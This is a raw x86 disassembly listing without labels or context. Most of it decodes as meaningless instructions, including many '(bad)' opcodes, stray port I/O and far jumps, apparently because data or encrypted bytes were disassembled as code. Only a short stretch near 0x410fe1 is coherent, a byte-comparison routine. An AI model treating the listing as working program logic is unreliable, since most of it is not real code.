  410a38:	mov    ah,0x21
  410a3a:	js     0x410a7c
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	jne    0x410a7d
  410a51:	mov    bh,0xa0
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a8c
  410a5c:	push   es
  410a5d:	dec    esp
  410a5e:	xchg   edi,eax
  410a5f:	out    dx,eax
  410a60:	cld    
  410a61:	not    ebp
  410a63:	jae    0x410a59
  410a65:	mov    ds:0x11876684,al
  410a6a:	(bad)  
  410a6b:	jmp    0x6239a58b
  410a70:	pop    ebp
  410a71:	push   ds
  410a72:	jmp    0xbb90:0x68c9faa4
  410a79:	loopne 0x410a4a
  410a7b:	xor    BYTE PTR [edi-0x44],dh
  410a7e:	cmc    
  410a7f:	enter  0x31d8,0xa5
  410a83:	fld    QWORD PTR [ebx+0x23]
  410a86:	jne    0x410aa5
  410a88:	and    eax,0x874c42a4
  410a8d:	(bad)  
  410a8f:	fldenv [ecx]
  410a91:	cld    
  410a92:	mov    bh,0xe3
  410a94:	inc    ecx
  410a95:	pop    es
  410a96:	dec    ebp
  410a97:	adc    dh,BYTE PTR [edx+0x54]
  410a9a:	sti    
  410a9b:	xor    ebx,esp
  410a9d:	fcomp  QWORD PTR cs:[edx]
  410aa0:	push   ebx
  410aa1:	pusha  
  410aa2:	cdq    
  410aa3:	push   ebp
  410aa4:	in     eax,dx
  410aa5:	nop
  410aa6:	stos   DWORD PTR es:[edi],eax
  410aa7:	les    edx,FWORD PTR ds:0xb91669b9
  410aad:	in     al,dx
  410aae:	or     ah,dh
  410ab0:	ret    
  410ab1:	mov    edx,0x3b53000
  410ab6:	dec    ebx
  410ab7:	or     bh,BYTE PTR [edi]
  410ab9:	sub    DWORD PTR [esp],edx
  410abc:	dec    ebx
  410abd:	mov    edx,0x96070df9
  410ac2:	scas   al,BYTE PTR es:[edi]
  410ac3:	sbb    eax,0x1ed9347c
  410ac8:	add    dl,ah
  410aca:	jge    0x410af1
  410acc:	jle    0x410ab1
  410ace:	push   cs
  410acf:	mov    eax,ds:0xf253645c
  410ad4:	fld    DWORD PTR [eax+0x7801e3e7]
  410ada:	lea    eax,[eax-0x2dfbbf1d]
  410ae0:	dec    esi
  410ae1:	mul    BYTE PTR [eax-0x40]
  410ae4:	shr    BYTE PTR [edx+0x44],0x13
  410ae8:	aas    
  410ae9:	jecxz  0x410a88
  410aeb:	stos   DWORD PTR es:[edi],eax
  410aec:	pop    ss
  410aed:	mov    WORD PTR [edi+eiz*2-0x2179573a],es
  410af4:	ret    
  410af5:	and    DWORD PTR [esi+eax*8+0x3e],edx
  410af9:	xlat   BYTE PTR ds:[ebx]
  410afa:	cmc    
  410afb:	adc    al,0x69
  410afd:	xchg   esp,eax
  410afe:	je     0x410ab8
  410b00:	fdivr  st,st(1)
  410b02:	cmp    DWORD PTR [edi],edx
  410b04:	xchg   ebx,eax
  410b05:	imul   edi,DWORD PTR [eax-0x1],0x63
  410b09:	pop    edx
  410b0a:	jecxz  0x410ac8
  410b0c:	sbb    eax,ebp
  410b0e:	test   ch,bl
  410b10:	mov    esp,DWORD PTR [ebx-0x725136b7]
  410b16:	adc    al,0x41
  410b18:	and    bh,BYTE PTR [ebx-0x14]
  410b1b:	pop    ecx
  410b1c:	pop    ebx
  410b1d:	sbb    eax,0xac4b9e63
  410b22:	or     al,BYTE PTR [ebx+0x36]
  410b25:	mov    bl,0x79
  410b27:	jl     0x410b8b
  410b29:	aad    0xca
  410b2b:	push   ecx
  410b2c:	into   
  410b2d:	mov    al,ds:0x1777220d
  410b32:	stos   DWORD PTR es:[edi],eax
  410b33:	arpl   sp,bx
  410b35:	xchg   ebp,eax
  410b36:	sti    
  410b37:	adc    eax,0x2ed7aade
  410b3c:	fcom   DWORD PTR [ebx+0x69]
  410b3f:	aaa    
  410b40:	(bad)  
  410b41:	pop    esi
  410b42:	push   edx
  410b43:	jne    0x410afe
  410b45:	gs inc ebx
  410b47:	jp     0x410ad0
  410b49:	xor    eax,0xd4833b49
  410b4e:	cli    
  410b4f:	test   al,bh
  410b51:	or     BYTE PTR [ebp+0x48],al
  410b54:	mov    BYTE PTR [ebp-0x50598939],cl
  410b5a:	pop    ss
  410b5b:	sti    
  410b5c:	push   eax
  410b5d:	cmc    
  410b5e:	add    ecx,DWORD PTR [edi+eax*2]
  410b61:	inc    ebx
  410b62:	aas    
  410b63:	pop    edx
  410b64:	fcom   DWORD PTR [esi]
  410b66:	lds    edx,FWORD PTR [edx]
  410b68:	push   eax
  410b69:	test   ch,bh
  410b6b:	jmp    0xb021:0xfab232bf
  410b72:	sahf   
  410b73:	jne    0x410b89
  410b75:	rcl    BYTE PTR [ecx],cl
  410b77:	inc    edi
  410b78:	ja     0x410b26
  410b7a:	repz cmp DWORD PTR [esi-0x31],ebx
  410b7e:	sub    BYTE PTR [eax],cl
  410b80:	scas   al,BYTE PTR es:[edi]
  410b81:	out    dx,al
  410b82:	addr16 cmp al,dh
  410b85:	sbb    DWORD PTR [ebx],0x12
  410b88:	pop    ebp
  410b89:	fcom   st(7)
  410b8b:	sbb    DWORD PTR [ebp-0x2d1f267a],0x1151ae44
  410b95:	fdivr  DWORD PTR [ebp+0x4f7954be]
  410b9b:	(bad)  
  410b9c:	adc    ah,BYTE PTR [edx]
  410b9e:	mov    esp,DWORD PTR [ebp-0x6e]
  410ba1:	xchg   esp,eax
  410ba2:	sbb    al,0x19
  410ba4:	je     0x410b7b
  410ba6:	lods   al,BYTE PTR ds:[esi]
  410ba7:	sbb    DWORD PTR [edx+edi*4+0x1f],edi
  410bab:	out    0x2c,eax
  410bad:	sub    al,0x49
  410baf:	(bad)  
  410bb0:	xchg   ebx,eax
  410bb1:	xor    bl,dh
  410bb3:	lds    esp,FWORD PTR [edx]
  410bb5:	std    
  410bb6:	add    al,0x4a
  410bb8:	pop    esp
  410bb9:	(bad)  
  410bba:	xor    eax,0xd5e29731
  410bbf:	sub    BYTE PTR [ebp-0xf],ah
  410bc2:	dec    ebx
  410bc3:	jnp    0x410b7e
  410bc5:	shl    DWORD PTR [ebx-0x67],cl
  410bc8:	mov    ecx,0xd3144e5a
  410bcd:	jo     0x410b68
  410bcf:	ja     0x410be4
  410bd1:	xor    esp,DWORD PTR [edx]
  410bd3:	leave  
  410bd4:	out    0x81,eax
  410bd6:	js     0x410b65
  410bd8:	test   eax,0xcbdf71ee
  410bdd:	push   ecx
  410bde:	jno    0x410b72
  410be0:	stc    
  410be1:	out    dx,eax
  410be2:	out    dx,eax
  410be3:	mov    bl,0x8c
  410be5:	xlat   BYTE PTR ds:[ebx]
  410be6:	adc    ebx,DWORD PTR [eax]
  410be8:	adc    ch,BYTE PTR [ebx+0x57b1c4ca]
  410bee:	adc    eax,0xe143fa21
  410bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bf4:	add    BYTE PTR [esi-0x4153bcb],ah
  410bfa:	dec    esp
  410bfb:	in     al,dx
  410bfc:	lds    ebx,FWORD PTR [esi-0x7d]
  410bff:	inc    edx
  410c00:	(bad)  
  410c01:	mov    eax,ds:0xe74d9a3b
  410c06:	(bad)  
  410c07:	aas    
  410c08:	jp     0x410c6c
  410c0a:	retf   0x3f5d
  410c0d:	pop    esi
  410c0e:	lock femms 
  410c11:	daa    
  410c12:	jne    0x410c35
  410c14:	jo     0x410c03
  410c16:	inc    edi
  410c17:	inc    ebx
  410c18:	xor    eax,edi
  410c1a:	xchg   DWORD PTR [ebp-0x77],ecx
  410c1d:	sbb    ebx,esi
  410c1f:	daa    
  410c20:	cmp    bh,BYTE PTR [ecx+0x7a]
  410c23:	sti    
  410c24:	push   esp
  410c25:	(bad)  
  410c26:	xlat   BYTE PTR ds:[ebx]
  410c27:	push   0xf
  410c29:	xor    BYTE PTR [eax+0x17ee6799],al
  410c2f:	inc    esi
  410c30:	shr    dl,0xc3
  410c33:	in     al,dx
  410c34:	cli    
  410c35:	sbb    cl,bl
  410c37:	stos   BYTE PTR es:[edi],al
  410c38:	jne    0x410c66
  410c3a:	dec    ecx
  410c3b:	mov    ds:0x2a0dcd5a,eax
  410c40:	mov    edx,0xdacc07ba
  410c45:	lahf   
  410c46:	sub    DWORD PTR [eax+0x5e],0x5e
  410c4a:	xlat   BYTE PTR ds:[ebx]
  410c4b:	cld    
  410c4c:	xor    al,0x39
  410c4e:	dec    eax
  410c4f:	(bad)  
  410c50:	adc    al,BYTE PTR [esi+0x50085207]
  410c56:	ret    
  410c57:	mov    edx,0xf808db0e
  410c5c:	and    dl,BYTE PTR [edx+esi*8-0x33fe2f03]
  410c63:	fscale 
  410c65:	aad    0x54
  410c67:	mov    dl,0xf5
  410c69:	idiv   bl
  410c6b:	ins    DWORD PTR es:[edi],dx
  410c6c:	xor    edx,DWORD PTR [ebx]
  410c6e:	fcmovbe st,st(3)
  410c70:	mov    esi,0x7875c5cb
  410c75:	mov    ebp,0xb0730376
  410c7a:	repnz clc 
  410c7c:	dec    ebx
  410c7d:	bound  edx,QWORD PTR [ebp-0x7386d918]
  410c83:	outs   dx,BYTE PTR ds:[esi]
  410c84:	pop    esp
  410c85:	aas    
  410c86:	out    0x17,al
  410c88:	jbe    0x410d02
  410c8a:	mov    dh,0xa6
  410c8c:	push   0x5c
  410c8e:	sbb    ah,bh
  410c90:	cld    
  410c91:	jecxz  0x410cdf
  410c93:	xchg   ebp,eax
  410c94:	rol    esp,cl
  410c96:	or     BYTE PTR [edi],bl
  410c98:	and    al,0x8a
  410c9a:	adc    al,0x52
  410c9c:	fcom   DWORD PTR [esp+ebx*1+0x2f00c6cb]
  410ca3:	mov    esp,0xeb975fe2
  410ca8:	pushf  
  410ca9:	je     0x410c89
  410cab:	movsx  ebx,WORD PTR [ebx-0x4]
  410caf:	add    al,0x73
  410cb1:	dec    ecx
  410cb2:	pop    ecx
  410cb3:	dec    eax
  410cb4:	scas   eax,DWORD PTR es:[edi]
  410cb5:	scas   eax,DWORD PTR es:[edi]
  410cb6:	(bad)  
  410cb7:	cld    
  410cb8:	outs   dx,DWORD PTR ds:[esi]
  410cb9:	fwait
  410cba:	ja     0x410ca3
  410cbc:	(bad)  
  410cbd:	(bad)  
  410cbe:	loopne 0x410cd7
  410cc0:	in     eax,0x2
  410cc2:	sub    DWORD PTR [ecx+eax*8+0x2b587eb6],esp
  410cc9:	add    al,0x3d
  410ccb:	sbb    al,ch
  410ccd:	lock cmp eax,0x17491bef
  410cd3:	pcmpgtd mm0,QWORD PTR [esi+0x47]
  410cd7:	ins    DWORD PTR es:[edi],dx
  410cd8:	mov    ebx,0xce929eb6
  410cdd:	mov    ebx,DWORD PTR [ecx]
  410cdf:	out    0x27,al
  410ce1:	ins    BYTE PTR es:[edi],dx
  410ce2:	pop    esi
  410ce3:	and    eax,0xea4b4860
  410ce8:	xchg   ecx,eax
  410ce9:	cmp    ch,BYTE PTR [ebx+0x64ccd00b]
  410cef:	mov    esp,0x200d054b
  410cf4:	iret   
  410cf5:	dec    edi
  410cf6:	ja     0x410d66
  410cf8:	clc    
  410cf9:	lods   eax,DWORD PTR ds:[esi]
  410cfa:	je     0x410d0a
  410cfc:	inc    ecx
  410cfd:	xlat   BYTE PTR ds:[ebx]
  410cfe:	and    ecx,DWORD PTR [ecx+0x217dc8e8]
  410d04:	scas   eax,DWORD PTR es:[edi]
  410d05:	xchg   ebp,eax
  410d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d07:	fld    DWORD PTR [ecx]
  410d09:	cmovs  esp,DWORD PTR [ecx+ecx*4-0x7ba74fe]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x5617b89c
  410d25:	xchg   esp,eax
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410dad
  410d2f:	popf   
  410d30:	pop    ss
  410d31:	sbb    eax,0xe91b15c8
  410d36:	add    BYTE PTR [ecx+0x27a6ef96],bh
  410d3c:	fs popf 
  410d3e:	fcomp  QWORD PTR [eax-0xd]
  410d41:	mov    edx,ecx
  410d43:	or     eax,0x8a203867
  410d48:	xchg   esi,eax
  410d49:	add    eax,0x1472462a
  410d4e:	ins    BYTE PTR es:[edi],dx
  410d4f:	enter  0xd242,0xfb
  410d53:	imul   edi,DWORD PTR [edi+0x61],0x5140ef0b
  410d5a:	jmp    0x410d02
  410d5c:	and    ah,dl
  410d5e:	add    ah,BYTE PTR [ebx-0x50]
  410d61:	pop    edi
  410d62:	xor    DWORD PTR [ebx],ecx
  410d64:	jmp    0x410d60
  410d66:	cmp    al,0x7c
  410d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d69:	fcmovne st,st(7)
  410d6b:	xchg   esp,eax
  410d6c:	jne    0x410d8e
  410d6e:	(bad)  
  410d6f:	jmp    0x146:0x74c15da8
  410d76:	pop    eax
  410d77:	sub    ebp,DWORD PTR ds:0x13eaadc0
  410d7d:	jbe    0x410d2b
  410d7f:	shr    edx,1
  410d81:	in     al,0x9d
  410d83:	dec    esp
  410d84:	(bad)  
  410d85:	dec    ebx
  410d86:	rcl    DWORD PTR ds:0x9f577ae4,1
  410d8c:	iret   
  410d8d:	shl    BYTE PTR es:[ebx],0xb0
  410d91:	(bad)  
  410d93:	fsubr  st,st(4)
  410d95:	iret   
  410d96:	adc    BYTE PTR ds:0xbb8de98b,dh
  410d9c:	push   ds
  410d9d:	jo     0x410d6a
  410d9f:	sub    BYTE PTR [ecx-0x7b],bh
  410da2:	sub    esp,DWORD PTR [esi]
  410da4:	or     eax,DWORD PTR [eax]
  410da6:	call   0xcad64736
  410dab:	std    
  410dac:	jle    0x410d7d
  410dae:	lock xor DWORD PTR [eax],ebp
  410db1:	adc    al,0xf6
  410db3:	enter  0x9c7f,0x44
  410db7:	out    0x30,al
  410db9:	mov    esi,0xe0f48105
  410dbe:	clc    
  410dbf:	outs   dx,BYTE PTR ds:[esi]
  410dc0:	jg     0x410e09
  410dc2:	inc    esi
  410dc3:	or     DWORD PTR [esi+0x4307992e],eax
  410dc9:	iret   
  410dca:	fadd   QWORD PTR [esi+esi*2+0x2a7b086]
  410dd1:	inc    edx
  410dd2:	jp     0x410dec
  410dd4:	add    bh,bh
  410dd6:	iret   
  410dd7:	ret    0x84fd
  410dda:	pop    ebx
  410ddb:	dec    edx
  410ddc:	xor    eax,0x68c80d7a
  410de1:	cli    
  410de2:	jg     0x410de5
  410de4:	sub    DWORD PTR [edi],ebx
  410de6:	sbb    DWORD PTR [ecx],ebx
  410de8:	js     0x410ddb
  410dea:	xchg   BYTE PTR [esi-0x7592128f],cl
  410df0:	jae    0x410e4b
  410df2:	dec    ebx
  410df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df4:	dec    esi
  410df5:	sbb    DWORD PTR [ebx+0x5b],ebp
  410df8:	nop
  410df9:	and    BYTE PTR [eax+0x6a],0x5f
  410dfd:	cwde   
  410dfe:	inc    eax
  410dff:	pop    eax
  410e00:	or     DWORD PTR [edi-0x1804cd34],0xffffffdf
  410e07:	cmp    eax,DWORD PTR [ecx]
  410e09:	dec    edx
  410e0a:	in     eax,dx
  410e0b:	ret    
  410e0c:	gs xor eax,0xefc13fbd
  410e12:	dec    eax
  410e13:	sbb    DWORD PTR [ecx-0x3b29d09d],0xa1bb376e
  410e1d:	aas    
  410e1e:	jnp    0x410e9e
  410e20:	sbb    eax,0x35500e57
  410e25:	inc    ebx
  410e26:	mov    dl,0x25
  410e28:	push   0xb30894c4
  410e2d:	(bad)  
  410e2e:	xlat   BYTE PTR ds:[ebx]
  410e2f:	inc    ebp
  410e30:	(bad)  
  410e31:	retf   
  410e32:	or     DWORD PTR [edi-0x63],0x43da064e
  410e39:	(bad)  
  410e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e3b:	mov    ds:0xf6b40c93,eax
  410e40:	or     bl,BYTE PTR [edi+ebp*1+0x65]
  410e44:	ret    0x7f12
  410e47:	sub    al,0x55
  410e49:	or     DWORD PTR es:[edi],0xd5275997
  410e50:	cmp    DWORD PTR [edx-0x2735407d],esp
  410e56:	mov    ds:0x95584922,eax
  410e5b:	iret   
  410e5c:	jae    0x410df0
  410e5e:	es aam 0x8d
  410e61:	add    dl,BYTE PTR [ecx]
  410e63:	xchg   ebp,eax
  410e64:	dec    edx
  410e65:	push   eax
  410e66:	cmp    eax,DWORD PTR [ecx+0x7607f4ad]
  410e6c:	cmp    eax,0x1fc708fc
  410e71:	repnz push eax
  410e73:	out    dx,eax
  410e74:	enter  0xc7c5,0x4
  410e78:	pop    esp
  410e79:	test   al,bl
  410e7b:	jl     0x410e8b
  410e7d:	mov    esp,0xa9387a4
  410e82:	popf   
  410e83:	pop    es
  410e84:	sub    dh,bl
  410e86:	cmp    esi,DWORD PTR [esi-0x3c]
  410e89:	push   0xf5fe99d
  410e8e:	into   
  410e8f:	cmp    ah,BYTE PTR [ebp-0x13]
  410e92:	adc    BYTE PTR cs:[edx+0x52],bl
  410e96:	xor    ebp,DWORD PTR [esp+eax*8]
  410e99:	jp     0x410f12
  410e9b:	and    eax,DWORD PTR [ebp-0x3e]
  410e9e:	es add cl,dl
  410ea1:	in     al,dx
  410ea2:	sbb    al,0x98
  410ea4:	add    dl,BYTE PTR [edx+edx*2+0x3d]
  410ea8:	fsub   st,st(5)
  410eaa:	sub    BYTE PTR [ebx],bh
  410eac:	dec    esi
  410ead:	(bad)  
  410eae:	adc    BYTE PTR [edx],ch
  410eb0:	aaa    
  410eb1:	and    esp,edx
  410eb3:	shl    BYTE PTR [edx],1
  410eb5:	jmp    0x410e43
  410eb7:	add    ebp,DWORD PTR [ebp+0x6b50b5b0]
  410ebd:	pop    ebp
  410ebe:	(bad)
  410ec2:	sub    BYTE PTR [ecx-0x60],0x5
  410ec6:	xchg   esp,eax
  410ec7:	(bad)  
  410ec8:	int    0xb8
  410eca:	retf   0xfcc8
  410ecd:	jmp    0x221:0x54318b8f
  410ed4:	xchg   ebp,eax
  410ed5:	add    esp,eax
  410ed7:	cmp    al,0x81
  410ed9:	add    DWORD PTR [ecx-0x67e8d1d2],edx
  410edf:	scas   al,BYTE PTR es:[edi]
  410ee0:	pushf  
  410ee1:	(bad)  
  410ee2:	iret   
  410ee3:	outs   dx,BYTE PTR ds:[esi]
  410ee4:	das    
  410ee5:	cmc    
  410ee6:	je     0x410f26
  410ee8:	and    DWORD PTR [ecx],edx
  410eea:	call   0x92b2a180
  410eef:	ret    0x8569
  410ef2:	jmp    0x410e9c
  410ef4:	pop    eax
  410ef5:	mov    ch,0x13
  410ef7:	xor    al,0x9a
  410ef9:	adc    eax,0x26d006e0
  410efe:	xchg   ebx,eax
  410eff:	jo     0x410eca
  410f01:	jb     0x410f3d
  410f03:	push   edx
  410f04:	sub    bl,BYTE PTR [ebp-0x79]
  410f07:	mov    esi,0xeaea9345
  410f0c:	cmp    al,0xb5
  410f0e:	sar    DWORD PTR [ecx-0x6ddc10e5],0xf5
  410f15:	sbb    DWORD PTR [ecx],eax
  410f17:	in     al,dx
  410f18:	push   ecx
  410f19:	sub    edi,eax
  410f1b:	imul   edi,DWORD PTR [edx-0x142a46a3],0xffffffaa
  410f22:	lea    ebp,[eax+0x1a]
  410f25:	dec    ebx
  410f26:	mov    bl,0x7d
  410f28:	push   0x3c008edb
  410f2d:	mov    esi,0xd2340170
  410f32:	cwde   
  410f33:	ja     0x410f1c
  410f35:	loopne 0x410f3a
  410f37:	ins    BYTE PTR es:[edi],dx
  410f38:	or     BYTE PTR ds:0x7483d6c8,dl
  410f3e:	not    BYTE PTR [edi]
  410f40:	mov    WORD PTR [esi+0xc],es
  410f43:	std    
  410f44:	lahf   
  410f45:	dec    ebx
  410f46:	dec    ebx
  410f47:	retf   0xca2b
  410f4a:	pop    esp
  410f4b:	add    edi,DWORD PTR [edx]
  410f4d:	(bad)
  410f50:	mov    al,ds:0x83562582
  410f55:	add    BYTE PTR [edi-0x31],al
  410f58:	(bad)  
  410f59:	push   eax
  410f5a:	lock pop esp
  410f5c:	shr    BYTE PTR [ecx],1
  410f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f5f:	aam    0x34
  410f61:	mov    ebx,0x3690257
  410f66:	sbb    al,0x24
  410f68:	push   cs
  410f69:	fsubr  DWORD PTR [esi-0x67f35387]
  410f6f:	call   FWORD PTR [esi-0x413fc56d]
  410f75:	cmp    eax,0x46c257ff
  410f7a:	es ins BYTE PTR es:[edi],dx
  410f7c:	mov    BYTE PTR [ebp+0x4e],0x5e
  410f80:	xor    eax,0x8ff88bae
  410f85:	mov    ebx,0x7a6e50a3
  410f8a:	stos   DWORD PTR es:[edi],eax
  410f8b:	pushf  
  410f8c:	sbb    ah,dh
  410f8e:	mov    DWORD PTR [ebp+0x125891db],ecx
  410f94:	rcr    DWORD PTR [ecx-0xa320a63],0xc8
  410f9b:	adc    DWORD PTR ds:0x6fedb6be,ebp
  410fa1:	mov    ch,0x3e
  410fa3:	sub    dh,0xdc
  410fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fa7:	and    al,0x2b
  410fa9:	cmp    BYTE PTR [ecx+0x472d3fcc],dl
  410faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fb0:	bound  ebp,QWORD PTR ds:0xc9aea197
  410fb6:	dec    esp
  410fb7:	push   edi
  410fb8:	pop    ds
  410fb9:	shl    esi,cl
  410fbb:	mov    WORD PTR [ebx+0x1f],cs
  410fbe:	xor    ch,0x7b
  410fc1:	push   ss
  410fc2:	repz mov bl,0x5f
  410fc5:	jb     0x410fb3
  410fc7:	loopne 0x410f6f
  410fc9:	sub    ch,cl
  410fcb:	(bad)  
  410fcc:	and    edx,DWORD PTR [edx]
  410fce:	outs   dx,DWORD PTR ds:[esi]
  410fcf:	jns    0x411025
  410fd1:	outs   dx,BYTE PTR ds:[esi]
  410fd2:	sti    
  410fd3:	jns    0x411019
  410fd5:	ret    
  410fd6:	pop    eax
  410fd7:	mov    al,ds:0xc4a1229c
  410fdc:	mov    esp,0xc1330794
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411015
  41102b:	outs   dx,DWORD PTR ds:[esi]
  41102c:	adc    bl,BYTE PTR [edi+0x7e7e4718]
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x410fdc
  411037:	sub    eax,0xa1c03c2
  41103c:	jae    0x410fef
  41103e:	mov    dl,0x19
  411040:	add    BYTE PTR [esi],dh
  411042:	and    DWORD PTR [edi-0x1e],eax
  411045:	mov    bl,0xf
  411047:	nop
  411048:	jl     0x4110b6
  41104a:	lahf   
  41104b:	mov    ebp,0x7041ac6a
  411050:	xlat   BYTE PTR ds:[ebx]
  411051:	pop    esi
  411052:	test   ch,0x4d
  411055:	adc    eax,0x52c2f59f
  41105a:	xchg   esi,eax
  41105b:	cmp    DWORD PTR [esi-0x67724766],esi
  411061:	push   ds
  411062:	xor    al,0x56
  411064:	mov    edx,0x79b13064
  411069:	pop    esp
  41106a:	(bad)  
  41106b:	icebp  
  41106c:	jb     0x411052
  41106e:	(bad)  
  411070:	push   eax
  411071:	icebp  
  411072:	jmp    0xadb86ac5
  411077:	and    edx,DWORD PTR [esp+eax*2]
  41107a:	cld    
  41107b:	sbb    al,0x3d
  41107d:	das    
  41107e:	aam    0x47
  411080:	in     al,dx
  411081:	sti    
  411082:	inc    eax
  411083:	jge    0x411080
  411085:	stc    
  411086:	loop   0x411104
  411088:	shl    BYTE PTR [ecx+0x1895eece],0x4c
  41108f:	rcl    DWORD PTR [eax+0x73],cl
  411092:	sbb    edx,DWORD PTR [edx+0x21]
  411095:	jmp    0x411101
  411097:	sbb    esi,DWORD PTR [edi-0x7b]
  41109a:	jp     0x411087
  41109c:	xor    BYTE PTR [edi],0x8d
  41109f:	and    DWORD PTR cs:[edi+edx*4-0x29],ebp
  4110a4:	(bad)  
  4110a5:	lods   al,BYTE PTR ds:[esi]
  4110a6:	mov    ebp,0x6eef2805
  4110ab:	fstp   DWORD PTR [eax]
  4110ad:	mov    al,0x0
  4110af:	add    BYTE PTR [edx],bl
  4110b1:	fucom  st(1)
  4110b3:	pop    eax
  4110b4:	(bad)  [esi-0x5bfad639]
  4110ba:	inc    ecx
  4110bb:	jp     0x411079
  4110bd:	jge    0x4110d8
  4110bf:	xchg   edx,eax
  4110c0:	dec    edi
  4110c1:	cs pop eax
  4110c3:	das    
  4110c4:	mov    cl,0x93
  4110c6:	cli    
  4110c7:	iret   
  4110c8:	add    DWORD PTR [eax],edi
  4110ca:	mov    dl,0xb9
  4110cc:	jmp    0xd262717d
  4110d1:	add    esi,DWORD PTR [edi-0x6a]
  4110d4:	adc    BYTE PTR ds:0x93e995bb,bh
  4110da:	push   DWORD PTR ds:0xee87198
  4110e0:	gs out dx,al
  4110e2:	scas   eax,DWORD PTR es:[edi]
  4110e3:	push   ds
  4110e4:	mov    ah,0x88
  4110e6:	push   eax
  4110e7:	lock jbe 0x411156
  4110ea:	inc    ebp
  4110eb:	dec    ecx
  4110ec:	clc    
  4110ed:	cwde   
  4110ee:	imul   di,WORD PTR ds:0x731142c8,0x5bc8
  4110f7:	repnz les esi,FWORD PTR [edx-0x60d55ae1]
  4110fe:	test   al,0xde
  411100:	or     al,0x47
  411102:	add    DWORD PTR [ebp-0x6fe1e244],edx
  411108:	cmp    BYTE PTR [ebx+0x6fc57ef2],ch
  41110e:	jno    0x4110f4
  411110:	xor    BYTE PTR [ecx],ah
  411112:	cwde   
  411113:	dec    esi
  411114:	and    esp,esi
  411116:	pop    ss
  411117:	stos   BYTE PTR es:[edi],al
  411118:	aam    0x5d
  41111a:	(bad)  
  41111b:	mov    dh,0xdc
  41111d:	shr    DWORD PTR ds:0x248c200,0x5c
  411124:	pop    es
  411125:	jmp    0x41116e
  411127:	call   FWORD PTR [edi]
  411129:	enter  0x9c04,0xf4
  41112d:	xchg   ebp,eax
  41112e:	in     al,dx
  41112f:	ffreep st(6)
  411131:	cli    
  411132:	in     al,0x32
  411134:	rol    edx,cl
  411136:	call   0xbe733d83
  41113b:	push   0x42
  41113d:	fidiv  WORD PTR ds:0x5b468dfd
  411143:	adc    eax,0x15d64737
  411148:	(bad)  
  411149:	aas    
  41114a:	daa    
  41114b:	loop   0x4110df
  41114d:	mov    eax,0xdfe995bd
  411152:	inc    eax
  411153:	ss out 0x48,al
  411156:	cwde   
  411157:	push   esp
  411158:	out    0xed,eax
  41115a:	dec    ebp
  41115b:	sbb    DWORD PTR ds:0x4e1bcbb1,ebp
  411161:	out    dx,al
  411162:	add    ebx,DWORD PTR [edi+0x69]
  411165:	icebp  
  411166:	pop    edx
  411167:	test   al,0x4b
  411169:	outs   dx,DWORD PTR ds:[esi]
  41116a:	cmp    eax,0x78c0b4a0
  41116f:	bound  edx,QWORD PTR [eax]
  411171:	xchg   ecx,eax
  411172:	aad    0xe8
  411174:	lods   al,BYTE PTR ds:[esi]
  411175:	retf   
  411176:	cli    
  411177:	push   edi
  411178:	leave  
  411179:	mov    al,ds:0x74cbd24
  41117e:	clc    
  41117f:	adc    eax,0x150c1ea6
  411184:	in     al,dx
  411185:	les    ecx,FWORD PTR [edx-0x42]
  411188:	mov    ds:0xe876f206,eax
  41118d:	test   eax,0x8086f553
  411192:	inc    ebp
  411193:	retf   0x60a6
  411196:	mov    dh,0xdf
  411198:	jecxz  0x4111ed
  41119a:	cmp    dh,BYTE PTR [edx+0x48]
  41119d:	dec    ebp
  41119e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41119f:	or     BYTE PTR [ebx-0x35a7db2a],dl
  4111a5:	(bad)  
  4111a6:	(bad)  [ebx-0x59aae36]
  4111ac:	or     al,bl
  4111ae:	dec    ebx
  4111af:	int3   
  4111b0:	gs xor eax,0xad9d95d1
  4111b6:	jmp    0x4111ef
  4111b8:	cmp    DWORD PTR [esi],ecx
  4111ba:	call   0x157d:0x928a4f45
  4111c1:	add    al,0x12
  4111c3:	xchg   edx,eax
  4111c4:	mov    dl,ch
  4111c6:	in     eax,0x60
  4111c8:	aas    
